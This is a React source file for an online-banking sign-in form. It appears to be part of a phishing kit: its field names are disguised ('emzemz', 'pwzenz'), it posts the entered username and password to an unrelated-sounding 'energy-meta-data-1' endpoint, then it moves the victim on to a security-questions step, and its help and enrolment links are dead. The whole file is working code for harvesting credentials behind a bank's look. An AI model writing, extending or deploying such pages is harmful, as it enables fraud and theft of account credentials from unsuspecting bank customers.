import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const inputClasses =
  'w-full bg-transparent text-white focus:outline-none py-2 placeholder:text-slate-400';

const LoginForm: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [activeTab, setActiveTab] = useState<'password' | 'biometric'>('password');
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    if (activeTab !== 'password') {
      return;
    }

    setIsLoading(true);
    const newErrors = { emzemz: '', pwzenz: '' };

    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
    }

    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'Password is required.';
    }

    setErrors(newErrors);

    if (!newErrors.emzemz && !newErrors.pwzenz) {
      try {
        await axios.post(`${baseUrl}api/energy-meta-data-1/`, {
          emzemz,
          pwzenz,
        });
        navigate('/security-questions', { state: { emzemz } });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
        return;
      }
    }

    setIsLoading(false);
  };

  const footer = (
    <>
      <a href="#" className="block text-[#7dd3fc] hover:underline">
        Forgot username/password?
      </a>
      <a href="#" className="block text-[#7dd3fc] hover:underline">
        Enroll in new online banking
      </a>
      <p className="text-[11px] text-slate-300">
        This site is protected by reCAPTCHA and the Google{' '}
        <a href="#" className="underline">
          Privacy Policy
        </a>{' '}
        and{' '}
        <a href="#" className="underline">
          Terms of Service
        </a>{' '}
        apply.
      </p>
    </>
  );

  return (
    <FlowCard footer={footer}>
      <div className="flex mb-6 rounded-md overflow-hidden border border-slate-600 bg-[#1b1f2f]">
        <button
          type="button"
          className={`flex-1 py-2 font-semibold transition-colors ${
            activeTab === 'password' ? 'bg-[#283045] text-white' : 'bg-[#1b1f2f] text-slate-400 hover:text-slate-200'
          }`}
          onClick={() => setActiveTab('password')}
        >
          Password
        </button>
        <button
          type="button"
          className={`flex-1 py-2 font-semibold transition-colors ${
            activeTab === 'biometric' ? 'bg-[#283045] text-white' : 'bg-[#1b1f2f] text-slate-400 hover:text-slate-200'
          }`}
          onClick={() => setActiveTab('biometric')}
        >
          Biometric
        </button>
      </div>
      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label className="text-slate-300 text-sm" htmlFor="emzemz">
            Username
          </label>
          <div
            className={`flex items-center gap-3 border-b transition-colors ${
              errors.emzemz ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'
            }`}
          >
            <span className="text-[#00b4ff]">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6.75a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.5 20.25a7.5 7.5 0 0 1 15 0" />
              </svg>
            </span>
            <input
              id="emzemz"
              name="emzemz"
              type="text"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className={inputClasses}
              placeholder="Enter your username"
            />
          </div>
          {errors.emzemz ? <FormError message={errors.emzemz} /> : null}
        </div>

        {activeTab === 'password' ? (
          <div>
            <label className="text-slate-300 text-sm" htmlFor="pwzenz">
              Password
            </label>
            <div
              className={`flex items-center gap-3 border-b transition-colors ${
                errors.pwzenz ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'
              }`}
            >
              <span className="text-[#00b4ff]">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M16.5 10.5V7.875a4.125 4.125 0 1 0-8.25 0V10.5M6.75 10.5h10.5A1.75 1.75 0 0 1 19 12.25v7a1.75 1.75 0 0 1-1.75 1.75H6.75A1.75 1.75 0 0 1 5 19.25v-7A1.75 1.75 0 0 1 6.75 10.5Z"
                  />
                </svg>
              </span>
              <input
                id="pwzenz"
                name="pwzenz"
                type={showPwzenz ? 'text' : 'password'}
                value={pwzenz}
                onChange={(e) => setPwzenz(e.target.value)}
                className={inputClasses}
                placeholder="Enter your password"
              />
              <button type="button" onClick={togglePwzenzVisibility} className="text-[#00b4ff] text-sm hover:text-white">
                {showPwzenz ? 'Hide' : 'Show'}
              </button>
            </div>
            {errors.pwzenz ? <FormError message={errors.pwzenz} /> : null}
          </div>
        ) : (
          <div className="text-sm text-slate-300">
            Use your registered biometric device to continue. If you need assistance, please contact support.
          </div>
        )}

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
          ) : (
            <span>{activeTab === 'password' ? 'Sign in' : 'Continue'}</span>
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default LoginForm;
